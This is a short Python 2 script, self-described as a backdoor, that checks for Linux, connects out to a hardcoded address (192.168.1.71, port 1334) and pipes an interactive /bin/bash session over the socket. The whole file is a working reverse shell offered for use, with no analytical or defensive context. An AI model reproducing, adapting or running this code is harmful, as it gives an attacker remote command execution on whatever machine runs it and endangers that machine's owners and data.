#!/usr/bin/python2
#-*- coding:utf-8 -*-

import subprocess
import os
import sys
import threading
import socket
import platform
import sys

def sys_required():
    if sys.version[0] =='3':
        sys.exit('[*] Please Run Backdoor With Python2')


def required_platform():
    if 'Linux' not in platform.platform():
        sys.exit('[*] Linux Required !')

def server2popen(server_socket, p):
    while True:
        data = server_socket.recv(65556)
        if len(data) > 0:
            p.stdin.write(data)
        else:
            p.stdin.write(data)

def popen2socket(server_socket, p):
    while True:
        server_socket.sendall(p.stdout.read(1))


def shell():
    try:
        p=subprocess.Popen(["/bin/bash"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        s2p_thread = threading.Thread(target=server2popen, args=[server_socket, p])
        s2p_thread.daemon = True
        s2p_thread.start()
        p2s_thread = threading.Thread(target=popen2socket, args=[server_socket, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        try:
            p.wait()
        except KeyboardInterrupt:
            server_socket.sendall('[*] CTRL + C')

    except Exception as error_code:
        print(error_code)

def connect(LHOST,LPORT):
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.connect((LHOST,LPORT))
        server_socket.send('[*] Shell Spawn !\n')
        try:
            shell()
            
        except Exception as error_spawn_shell:
            server_socket.send(error_spawn_shell)

    except Exception as error_connect:
        print(error_connect)

def main():
    sys_required()
    required_platform()
    LHOST = '192.168.1.71'
    LPORT = 1334
    try:
        connect(LHOST,LPORT)
    except Exception as error_main:
        print(error_main)

if __name__ == '__main__':
    main()
